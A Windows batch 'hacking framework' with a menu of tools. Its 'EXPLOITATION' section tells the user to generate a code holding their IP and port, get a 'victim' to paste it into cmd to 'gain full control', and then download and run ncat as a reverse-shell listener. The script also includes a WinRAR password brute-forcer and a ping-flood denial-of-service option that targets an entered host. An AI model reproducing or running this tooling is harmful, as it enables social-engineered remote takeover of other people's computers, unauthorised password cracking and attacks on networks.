@echo off
color 2
set mainfile=%cd%
if exist tmpy.exe del tmpy.exe
net session >nul 2>&1
IF %ERRORLEVEL% == 0 goto nscancon
echo Run this tool as administrator.
pause
exit
:top
cd /
cd Users
cd %username%
cd desktop
cls
echo ----------------------------------------------
echo             OSXONLINE FRAMEWORK
echo ----------------------------------------------
echo.
echo [1] Website tracing
echo [2] Network scan
echo [3] Web grabber
echo [4] Youtube video downloader
echo [5] Demo brute force
echo [6] Tool downloader
echo [7] Site opener
echo [8] Color changer
echo [9] EXPLOITATION
echo [10] Deauthantication
echo.
set /p var=Enter the number:
       if %var% == 1 goto wt
       if %var% == 2 goto ns
       if %var% == 3 goto wg
       if %var% == 4 goto sd
       if %var% == 5 goto dbf
       if %var% == 6 goto td
       if %var% == 7 goto spd
       if %var% == 8 goto cc
       if %var% == 9 goto pm
       if %var% == 10 goto deauth
echo INVALID NUMBER!
pause
goto top
:wt
set /p tr=Enter the website's name that you want to trace:
tracert %tr%
pause
cls
goto top
:ns
set /p pi=Enter the website or ip address name that you want to scan:
ping %pi%
pause
cls
goto top
:wg
set /p w=Enter the website url:
set /p g=Enter the file name you want to store in:
powershell -command "Invoke-WebRequest '%w%' -Outfile '%g%.html'"
pause
goto top
:sd
set /p s=Enter the youtube video link:
powershell -command "Invoke-WebRequest 'https://yt-dl.org/downloads/2021.12.17/youtube-dl.exe' -Outfile 'tmpy.exe'"
tmpy.exe "%s%"
del tmpy.exe
pause
goto top
:dbf
cls
echo --------------------------------------
echo             BRUTE-FORCE
echo --------------------------------------
echo.
echo [1] Winrar file cracker (If the password is numeric)
echo.
set /p bfc=Enter the number(Default is 1):
:wbru
cls
echo --------------------------------------
echo         WINRAR BRUTE-FORCE
echo --------------------------------------
copy "C:\Program Files\WinRAR\Unrar.exe"
SET PASS=0
SET TMP=TempFold
MD %TMP%
:RAR
echo.
cls
echo --------------------------------------
echo         WINRAR BRUTE-FORCE
echo --------------------------------------
echo.
SET/P "NAME=File Name  : "
IF "%NAME%"=="" goto ProblemDetected
goto GPATH
:ProblemDetected
echo You can't leave this blank.
pause
goto RAR
:GPATH
SET/P "PATH=Enter Full Path (eg: C:\Users\Admin\Desktop) : "
IF "%PATH%"=="" goto PERROR
goto NEXT
:PERROR
echo You can't leave this blank.
pause
goto RAR
:NEXT
IF EXIST "%PATH%\%NAME%" GOTO SP
goto PATH
:PATH
cls
echo File couldn't be found. Make sure you include the (.RAR) extension at the end of the file's name.
pause
goto RAR
:SP
cls
echo Breaking Password...
echo.
echo Trying the passwords .....
:START
title Processing...
SET /A PASS=%PASS%+1
echo %PASS%
UNRAR E -INUL -P%PASS% "%PATH%\%NAME%" "%TMP%"
IF /I %ERRORLEVEL% EQU 0 GOTO FINISH
GOTO START
:FINISH
RD %TMP% /Q /S
Del "Unrar.exe"
cls
title 1 Password Found
echo.
echo File = %NAME%
echo Stable Password= %PASS%
echo.
echo Press any key to exit.
pause>NUL
goto top
:td
echo This part is unavailable right now!
pause
goto top
:spd
set /p p=Enter the website's url:
start %p%
pause
goto top
:cc
echo Change color of the tool.
set /p k=Enter a color's name (white,green,blue,red,pink,purple):
       if %k% == white color F
       if %k% == green color 2
       if %k% == blue color 1
       if %k% == red color 4
       if %k% == pink color d
       if %k% == purple color 5
pause
goto top
:pm
cls
echo This is the main part of this tool. You have to enter you ip address and port. And then it will generate a code.
echo You have to send the code to victim. The victim must use windows 7 or above. And tell the victim to open cmd.
echo If you don't know how to open cmd, Then i will tell you.
echo You have to press (win + r) key at the same time. And a box will open at the bottom left corner.
echo you have to type cmd and press enter.
echo After the victim opens cmd then tell him to enter the generated code and press enter.
echo After that you will gain full comntrol of that computer.
pause
:ask_exploitation
cls
echo ------------------------------------------------------
echo                   EXPLOITATION
echo ------------------------------------------------------
echo.
echo [1] Generate explotation code
echo [2] Start listener
echo.
set /p var=Enter the number:
       if %var% == 1 goto exploitation
       if %var% == 2 goto listener
echo INVALID NUMBER!
pause
goto ask_exploitation
:exploitation
cls
echo -------------------------------------------------------
echo                   EXPLOITATION
echo -------------------------------------------------------
echo.
set /p ip=Enter your ip address:
set port=9001
set /p port=Enter your port(Default is 9001):
echo [*] Generating code .....
timeout 4 >nul
set mfc=%cd%
echo f | xcopy /I "%mainfile%/myfile.txt" "%mainfile%/myFile2.txt" >nul
powershell -Command "(gc "%mainfile%/myFile2.txt") -replace 'changeip', '%ip%' | Out-File -encoding ASCII '%mainfile%/myFile2.txt'"
powershell -Command "(gc "%mainfile%/myFile2.txt") -replace 'changeport', '%port%' | Out-File -encoding ASCII '%mainfile%/myFile2.txt'"
echo.
type myfile2.txt
echo.
del myfile2.txt
pause
goto ask_exploitation
:listener
cls
echo -------------------------------------------------------
echo                    EXPLOITATION
echo -------------------------------------------------------
echo.
set /p lport=Enter the listening port:
powershell -command "Invoke-WebRequest 'https://github.com/Arnob231/tmpyncat/raw/main/ncat.exe' -Outfile 'tmpy.exe'"
echo.
tmpy.exe -lvnp %lport%
del tmpy.exe
goto top
:deauth
set /p deau=Enter the level (aggressive,normal):
       if %deau% == aggressive goto agg
       if %deau% == normal goto nor
echo INVALID OPTION!
pause
goto top
:nor
set /p deaut=Enter the ip address or website url of the target:
cls
echo Sending deauthentication mass ..... 
ping %deaut% -t -l 65500
echo.
echo I will update this section next time.
pause
goto top
:agg
set /p deaut=Enter the ip address or website url of the target:
cls
echo [*] Oppening multi dos service .....
echo [*] Service started ......
if exist dos.bat goto sdetas
echo @echo off >> dos.bat
echo color 2 >> dos.bat
echo :loop >> dos.bat
echo ping %deaut% -t -l 65500 >> dos.bat
echo goto loop >> dos.bat
:sdetas
start dos.bat
start dos.bat
start dos.bat
start dos.bat
pause >nul
goto top
:: https://Arnob231.github.io/tmpyncat/ncat.exe
:nscancon
set host=192.168.0.1
ping -n 1 "%host%" | find "unreachable"
if %errorlevel% == 0 goto cancelfnet
goto top
:cancelfnet
cls
echo You need a stable wifi or network connection to run this tool.
pause
exit